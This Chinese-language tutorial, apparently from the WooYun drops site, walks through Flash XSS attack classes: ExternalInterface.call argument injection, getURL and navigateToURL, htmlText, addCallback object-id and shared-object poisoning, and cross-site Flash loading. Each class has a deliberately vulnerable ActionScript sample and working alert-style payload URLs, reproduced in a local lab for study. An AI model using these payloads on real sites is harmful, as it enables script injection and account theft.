# 常见Flash XSS攻击方式

0x01 HTML中嵌入FLASH
-----------------

* * *

在HTML中嵌入FLASH的时候在IE和非IE浏览器下嵌入的方式有所不同，可以使用embed标签和object标签，使用如下的代码进行嵌入：

IE下嵌入

```
<object codeBase="http://fpdownload.macromedia.com/get/Flashplayer/current/swFlash.cab#version=8,0,0,0" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000">
<param name="movie" value = "http://xxxx.sinaapp.com/trace.swf" />
<param name="allowScriptAccess" value="always" />
<param name="allowNetworking" value="all" />
</object>

```

非IE下嵌入

```
<object type="application/x-shockwave-Flash" data="./trace.swf">
<param name="movie" value = "./trace.swf" />
<param name="allowScriptAccess" value="always" />
<param name="allowNetworking" value="all" />
</object>

```

在插入Flash的过程中有两个重要的参数，allowScriptAccess和allowNetworking两个参数：

```
allowScriptAccess：控制html页面与Flash页面的通讯。
always：html和Flash页面的通讯不做任何的限制；
samedomain：html和Flash同域的时候可以做通讯【这个值是默认值】；
never：html和Flash禁止通讯。

allowNetworking：控制Flash与外部的网络通讯。
all：Flash所有的网络API通讯接口都可用；
internal：navigateToURL，fscommand，ExternalInterface.call不可用；
none：所有的网络API不可用。

```

以chrome浏览器为例来验证以上参数，首先在本地搭建环境，并且新建一个Flash文件，Flash文件包括的内容主要是使用ExternalInterface.call执行力一个js语句，弹出当前域的域名。

1）：插入本地的Flash文件。

```
<object type="application/x-shockwave-Flash" data="./trace.swf">
<param name="movie" value = "./trace.swf" />
<param name="allowScriptAccess" value="always" />
<param name="allowNetworking" value="all" />
</object>

```

运行结果：

![enter image description here](http://drops.javaweb.org/uploads/images/76c7cbedb0e4834185655c2041d37de869e03bef.jpg)

2）：插入本地的Flash，将allowScriptAccess参数改为samedomain。

```
<object type="application/x-shockwave-Flash" data="./trace.swf">
<param name="movie" value = "./trace.swf" />
<param name="allowScriptAccess" value="samedomain" />
<param name="allowNetworking" value="all" />

```

运行结果：

![enter image description here](http://drops.javaweb.org/uploads/images/251049f23a2d690db503db020fa149d33acc5fe5.jpg)

Html界面与Flash属于同域，因此能够弹出。

3）：插入本地Flash，将allowScriptAccess改为never。

```
<object type="application/x-shockwave-Flash" data="./trace.swf">
<param name="movie" value = "./trace.swf" />
<param name="allowScriptAccess" value="never" />
<param name="allowNetworking" value="all" />
</object>

```

运行结果没有弹出。

4）：插入远程Flash，将allowScriptAccess改为always。

```
<object type="application/x-shockwave-Flash" data="http://xxxxx.sinaapp.com/trace.swf">
<param name="movie" value = "http://xxxx.sinaapp.com/trace.swf" />
<param name="allowScriptAccess" value="always" />
<param name="allowNetworking" value="all" />
</object>

```

运行结果：

![enter image description here](http://drops.javaweb.org/uploads/images/efaa2010ac8be11f9e07a06de7dd764c6fb309e1.jpg)

注意这里弹出的域为当前html的域名，非Flash的域。

5）：插入远程Flash，将allowScriptAccess改为samedomain

```
<object type="application/x-shockwave-Flash" data="http://xxxxx.sinaapp.com/trace.swf">
<param name="movie" value = "http://xxxx.sinaapp.com/trace.swf" />
<param name="allowScriptAccess" value="samedomain" />
<param name="allowNetworking" value="all" />
</object>

```

运行结果没有弹出，因为Flash的域不和html在同一域内。

6）：插入远程Flash，将allowScriptAccess改为never

```
<object type="application/x-shockwave-Flash" data="http://xxxxx.sinaapp.com/trace.swf">
<param name="movie" value = "http://xxxxx.sinaapp.com/trace.swf" />
<param name="allowScriptAccess" value="never" />
<param name="allowNetworking" value="all" />
</object>

```

运行结果没有弹出，由于禁止了与html界面通讯。

7）将allowScriptAccess置为always，将allowNetworking置为internal

```
<object type="application/x-shockwave-Flash" data="http://xxxxx.sinaapp.com/trace.swf">
<param name="movie" value = "http://xxxxx.sinaapp.com/trace.swf" />
<param name="allowScriptAccess" value="always" />
<param name="allowNetworking" value="internal" />

```

运行结果没有弹出，allowNetworking的参数置为internal，禁止了接口ExternalInterface.all。

0x02 Flash跨域请求
--------------

* * *

Flash跨域访问的时候主要受到crossdomain.xml文件的影响。crossdomain.xml文件严格遵循xml语法，主要作用就是当被Flash请求到本域资源的时候，是否允许请求。 例如： www.evil.com中嵌入一个Flash，Flash跨域请求www.q.com下的资源，此时会先查看www.q.com目录下的crossdomain.xml文件，查看是否允许evil.com域Flash请求本域的资源。 crossdomain.xml文件主要包含如下几个节点：

```
site-control，allow-access-from，allow-access-from-identity，allow-http-request-headers-from

```

常用的节点为allow-access-from【可能我见的少= =】，用来指明允许本域资源允许被哪些域名的Flash跨域请求。

例如下面为优酷的crossdomain.xml文件：

```
<cross-domain-policy>
<allow-access-from domain="*.youku.com"/> //允许youku.com域名的Flash访问
<allow-access-from domain="*.ykimg.com"/>
<allow-access-from domain="*.tudou.com"/>
<allow-access-from domain="*.tudouui.com"/>
<allow-access-from domain="*.tdimg.com"/>
</cross-domain-policy>

```

Ps.这个文件常常被用到Flash csrf中，当allow-access-from domain被设置为*后，可能存在Flash csrf的风险。

0x03 常见Flash xss分类总结
--------------------

* * *

**Flash缺陷参数-getURL**

Flash提供相关的函数，可以执行js代码，getURL【AS2中支持】，navigateToURL【AS3中支持】，ExternalInterface.call。 在wooyun中搜索到了一个相关实例：

[WooYun: 久游网FLASH安全问题深入分析与利用(一)](http://www.wooyun.org/bugs/wooyun-2013-018472)

本着学习的原则本地搭建实践了下： 本地新建了个Flash，Flash调用外部资源xml文件。 Flash代码：

```
var root_xml:XML = new XML();
root_xml.ignoreWhite = true;
root_xml.onLoad = function(success){
    if(success){
        getURL(root_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue)
    }else{
        getURL("javascript:alert(‘fail’)")
    }
}
root_xml.load(_root.url);

```

xml文件：

```
<?xml version="1.0" encoding="utf-8" ?>
<data>
    <link>javascript:alert('xss')</link>
</data>

```

运行结果：

![enter image description here](http://drops.javaweb.org/uploads/images/6c533f2d63c31c03769cd92fefc253749d13a764.jpg)

Ps.此类问题一般可以使用google搜索xml文件被swf调用的情况，传入的内容如果没做过滤，很可能出现此类问题。

**Flash缺陷参数-navigateToURL**

* * *

上例中getURL（）为AS2中的方法，在AS3中使用的是navigateToURL，wooyun中上报过此参数导致Flash xss的实例。

[WooYun: [腾讯实例教程] 那些年我们一起学XSS - 14. Flash Xss入门 [navigateToURL]](http://www.wooyun.org/bugs/wooyun-2012-016512)

此类问题原理一般是由于调用了的资源文件（如xml）可被攻击者控制，导致了Flash xss。

本着学习的原则，本地搭建实践了下： Flash文件：

```
var url:String = stage.loaderInfo.parameters.url
var req:URLRequest = new URLRequest("a.xml");
var ld:URLLoader = new URLLoader();
ld.addEventListener(Event.COMPLETE ,ok);
function ok(evtObj:Event):void {
    if(ld.data){
        navigateToURL(new URLRequest(url),'_self')
    } else {        
    }
}
ld.load(req)

```

大致意思就是从外部获取了一个参数，通过navigateToURL调用。

运行结果：

![enter image description here](http://drops.javaweb.org/uploads/images/33f93de920c8bd1239f9e15f0b651a80efed9200.jpg)

**Flash缺陷参数-ExternalInterface.call(参数一)**

ExternalInterface.call同样是一个Flash提供的可以执行js的接口函数， ExternalInterface.call函数有两个参数，形如ExternalInterface.call("函数名","参数1")。

Flash最后执行的JS代码如下：

```
try { __Flash__toXML(函数名("参数1")) ; } catch (e) { "<undefined/>"; }

```

此段先考虑参数1，即函数名。

Wooyun上相关的实例有：

[WooYun: [腾讯实例教程] 那些年我们一起学XSS - 15. Flash Xss进阶 [ExternalInterface.call第一个参数]](http://www.wooyun.org/bugs/wooyun-2012-016532)

[WooYun: Flash应用安全系列[1]--360反射型跨站](http://www.wooyun.org/bugs/wooyun-2013-017013)

这两篇都写的很详细。

本着学习的原则，本地搭建实践了下： Flash文件：

```
var a:String = root.loaderInfo.parameters.func
if(ExternalInterface.available){
    ExternalInterface.call(a)
} else {
    trace(100)
}
stop()

```

从外部获取参数func，使用ExternalInterface.call接收第一个参数，执行。

对比：

```
try { __Flash__toXML(函数名("参数1")) ; } catch (e) { "<undefined/>"; }

```

创建url：

```
http://192.168.4.70/ExternalInterface_first.swf?func=alert(1))}catch(e){alert(100)}//

```

这样实际执行的js代码为：

```
try { __Flash__toXML(alert(1))}catch(e){alert(100)}// ("参数1")) ; } catch (e) { "<undefined/>"; }

http://192.168.4.70/ExternalInterface_first.swf?func=a1lert(1))}catch(e){alert(100)}//

try { __Flash__toXML(a1lert(1))}catch(e){alert(100)}// ("参数1")) ; } catch (e) { "<undefined/>"; }

```

预期结果应该是第一个url执行之后弹出数字1，第二个url执行之后弹出数字100。 访问

```
http://192.168.4.70/ExternalInterface_first.swf?func=alert(1))}catch(e){alert(100)}//

```

![enter image description here](http://drops.javaweb.org/uploads/images/a4c2d58feb62e48c39edc4759fdf5d90c9945cf2.jpg)

访问

```
http://192.168.4.70/ExternalInterface_first.swf?func=a1lert(1))}catch(e){alert(100)}//

```

![enter image description here](http://drops.javaweb.org/uploads/images/cc17348d72283f209ed19c0d9d235268018b6825.jpg)

和预期结果一样。

**Flash缺陷参数-ExternalInterface.call(参数二)**

有时候当反编译swf之后，会发现可控的参数的输出位置在ExternalInterface.call函数的第二个参数，方法和思路与第一个参数的时候类似。

Wooyun里面相关的例子：

[WooYun: [腾讯实例教程] 那些年我们一起学XSS - 16. Flash Xss进阶 [ExternalInterface.call第二个参数]](http://www.wooyun.org/bugs/wooyun-2012-016598)

[WooYun: Flash应用安全系列[3]--WordPress反射型跨站(0day)](http://www.wooyun.org/bugs/wooyun-2013-017189)

Flash文件：

```
var a:String = root.loaderInfo.parameters.par
if(ExternalInterface.available){
    ExternalInterface.call("alert",a)
} else {
    trace(100)
}
stop()

```

Flash文件中的a是从外部获取的参数，此处外部获取的参数par赋值给了a，作为输出点输出到了ExternalInterface的第二个参数的位置，此处相对于第一个参数的不同之处是，此处的输出点在引号中，因此此处我们需要把引号闭合掉。根据上面两边文章，可以发现闭合引号使用的方法是\”这样会被转义为\”，”就被吃掉了。

根据ExternalInterface.call的调用原型：

```
try { __Flash__toXML(函数名("参数1")) ; } catch (e) { "<undefined/>"; }

```

我们将参数输入如下的url：

```
http://192.168.4.70/ExternalInterface_second.swf?par=1111\%22),al)}catch(e){alert(1000)}//

```

分析应该执行如下：

```
try{
  __Flash__toXML(alert(“1111\\”),al
}
catch(e){
  alert(1000)
}

```

如此下来应该就会弹出两个框，一个为1111\，另外一个为1000。 运行结果，弹出1111\：

![enter image description here](http://drops.javaweb.org/uploads/images/61c8d2a338b17fc7377b5ce40f3ad223053a1d1a.jpg)

点击确定，弹出1000：

![enter image description here](http://drops.javaweb.org/uploads/images/86d13048d8fc00099254fa280127a42abcffc240.jpg)

Ps. 此处ExternalInterface.call调用的函数名，编写Flash的时候设置了alert，因此此处会弹两次，一般情况下，函数名是不能够被控制，这样我们使得，前面的函数执行异常，执行catch中的js即可。

**Flash缺陷参数-htmlText**

Flash支持在Flash里内嵌html，支持的标签img标签，a标签等。 img标签可以通过src参数引入一个Flash文件，类似与XSF一样。

[WooYun: Flash应用安全系列[6]--新浪微博蠕虫威胁](http://www.wooyun.org/bugs/wooyun-2013-017699)

文档写的很详细，推荐阅读。 本着学习的原则，本地创建了Flash文件，

```
import fl.controls.TextArea;
var a:String = root.loaderInfo.parameters.url
var t:TextArea = new TextArea()
t.width = 500
t.height = 300
t.htmlText += a
addChild(t)

```

从获取URL中的参数url，赋值给a，变量a直接输出到了Textarea t中。 访问如下url：

```
http://192.168.4.70/htmltext.swf?url=%3Cimg%20src=%27./trace.swf%27%3E

```

访问结果如下：

![enter image description here](http://drops.javaweb.org/uploads/images/99cb20682c95c7f91730a4c2524283f093ea5be7.jpg)

Ps.当反编译Flash文件，发现htmltext输出点的时候，可以查看相关是否存在相关的可控的输入，可能存在xss。 Flash缺陷参数object的id可控 html与swf通讯的时候，使用的是ExternalInterface.addCallback函数，调用如下：

```
function a(){
  trace(“hi”);
}
ExternalInterface.addCallback(“test”,a);

```

执行了函数之后，在html上可以通过使用函数名test来调用Flash中的函数a。

addCallback的原理：

```
if ((((activeX == true)) && (!((objectID == null))))){

    _evalJS((((("__Flash__addCallback(document.getElementById(\"" + objectID) + "\"), \"") + functionName) + "\");"));

};

```

objectID为Flash的id，functionName为函数名称，因此当我们插入的Flash的id可控的时候，可能会出现xss问题。

Wooyun上已经出现的类似问题：

[WooYun: [腾讯实例教程] 那些年我们一起学XSS - 21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]](http://www.wooyun.org/bugs/wooyun-2013-016803)

[WooYun: Flash应用安全系列[4]--Flash Player的又一个0day](http://www.wooyun.org/bugs/wooyun-2013-017309)

[WooYun: QQ空间某功能缺陷导致日志存储型XSS - 12](http://www.wooyun.org/bugs/wooyun-2013-021020)

本着学习的原则，本地创建了Flash文件，

```
function a(){
    trace("hi")
}
ExternalInterface.addCallback("test",a)

```

x.html页面

```
<object id="addcallback,&quot;),(function(){if(!window.x){window.x=1;alert(1)}})(),(&quot;" codeBase="http://fpdownload.macromedia.com/get/Flashplayer/current/swFlash.cab#version=8,0,0,0" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000">
<param name="movie" value = "./addCallback.swf" />
<param name="allowScriptAccess" value="always" />
<param name="allowNetworking" value="all" />
</object>

```

访问该界面（IE8下测试）：

![enter image description here](http://drops.javaweb.org/uploads/images/f110ca87afc1e068aca56fb94afc4efef91dea80.jpg)

**Flash缺陷参数addcallback与lso结合**

这个问题出现的点在addCallback声明的函数，在被html界面js执行之后的返回值攻击者可控，导致了xss问题。使用lso中首先会setlso，写入脏数据，然后getlso获取脏数据。

Wooyun实例链接：

[WooYun: 一个flash的0day导致的淘宝网存储xss(可形成永久后门)](http://www.wooyun.org/bugs/wooyun-2013-039481)

[WooYun: 一个flash的0day导致的淘宝网存储xss 【续集】](http://www.wooyun.org/bugs/wooyun-2013-040838)

[WooYun: 一个可大规模悄无声息窃取淘宝/支付宝账号与密码的漏洞 -（埋雷式攻击附带视频演示）](http://www.wooyun.org/bugs/wooyun-2014-051615)

[WooYun: 我是如何实现批量种植rootkit窃取阿里云账号密码的](http://www.wooyun.org/bugs/wooyun-2014-054102)

drops下相关资料：

[一个可大规模悄无声息窃取淘宝/支付宝账号与密码的漏洞 -（埋雷式攻击附带视频演示）](http://drops.wooyun.org/papers/1426)

本着学习的原则，本地创建了Flash文件，

```
function setlso(_arg1:String):Boolean{
    var _local2:SharedObject = SharedObject.getLocal("kj");
    _local2.data.key = _arg1;
    _local2.flush();
    return (true);
}

function getlso():String{
    var _local1:SharedObject = SharedObject.getLocal("kj");
    if(_local1.data.key == undefined){
        return ("");
    }
    return (_local1.data.key);
}
ExternalInterface.addCallback("getlso",getlso)
ExternalInterface.addCallback("setlso",setlso)

```

x.html

```
<html>
<head></head>
<body>
<object id="lso" type="application/x-shockwave-Flash" data="http://192.168.4.70/addCallback_lso.swf">
<param name="movie" value = "http://192.168.4.70/addCallback_lso.swf" />
<param name="allowScriptAccess" value="always" />
<param name="allowNetworking" value="all" />
</object>
<script>
function set(){
    document["lso"].setlso('aa\\";alert(document.domain);//aa');
}
function get(){
    document["lso"].getlso();
}

setTimeout("get()",5000)
setTimeout("get()",7000)
</script>
</body>
</html>

```

运行结果：

![enter image description here](http://drops.javaweb.org/uploads/images/19d7c58dce945682835ce95a03d70e3f88fcc86c.jpg)

**跨站Flash**

跨站Flash即XSF，通过AS加载第三方的Flash文件，如果这个第三方Flash可以被控制，就可以实现XSF。 在AS2中使用loadMove函数等加载第三方Flash。

```
_root.loadMovie(swf)；

```

在AS3中使用Loader类进行外部数据处理：

```
var param:Object = root.loaderInfo.parameters;
var swf:String = param[“swf”];
var myLoader:Loader = new Loader();
var url:URLRequest = new URLRequest(swf);
myLoader.load(url);
addChild(myLoader);

```

wooyun上实例：

[WooYun: sina微薄存储型跨站](http://www.wooyun.org/bugs/wooyun-2011-01768)

[WooYun: sina微博存储型跨站Ⅱ](http://www.wooyun.org/bugs/wooyun-2011-01904)

[WooYun: sina微博存储型跨站Ⅲ](http://www.wooyun.org/bugs/wooyun-2011-03574)

[WooYun: 百度贴吧存储型XSS - Flash又中枪了～～](http://www.wooyun.org/bugs/wooyun-2012-08354)

本地搭建环境，新建Flash：

```
var param:Object = root.loaderInfo.parameters;
var swf:String = param["swf"];
var myLoader:Loader = new Loader();
var url:URLRequest = new URLRequest(swf);
myLoader.load(url);
addChild(myLoader);

```

新建本地html文件：

```
<object id="lso" type="application/x-shockwave-Flash" data="http://192.168.4.70/xsf.swf">
<param name="movie" value = "http://192.168.4.70/xsf.swf" />
<param name="allowScriptAccess" value="always" />
<param name="allowNetworking" value="all" />
<param name="Flashvars" value="swf=http://xxxxx.sinaapp.com/trace.swf"
</object>

```

运行结果，加载了远程有缺陷的swf文件导致了xsf。

![enter image description here](http://drops.javaweb.org/uploads/images/f21668c8d523a5017c012e06952dd8f93075c6c0.jpg)

**其他**

1：addCallback返回值从其他地方获取。

[WooYun: QQ空间某功能缺陷导致日志存储型XSS - 14](http://www.wooyun.org/bugs/wooyun-2014-051432)

2：利用上传文件如xx.swf修改为xx.jpg获得上传目标域下的swf。

[WooYun: Flash应用安全系列[5]--QQ邮箱永久劫持漏洞](http://www.wooyun.org/bugs/wooyun-2013-017459)

[WooYun: 腾讯某分站可上传任意swf文件导致的一系列问题（附简单POC）](http://www.wooyun.org/bugs/wooyun-2014-062461)

drops相关链接：

[上传文件的陷阱](http://drops.wooyun.org/tips/2031)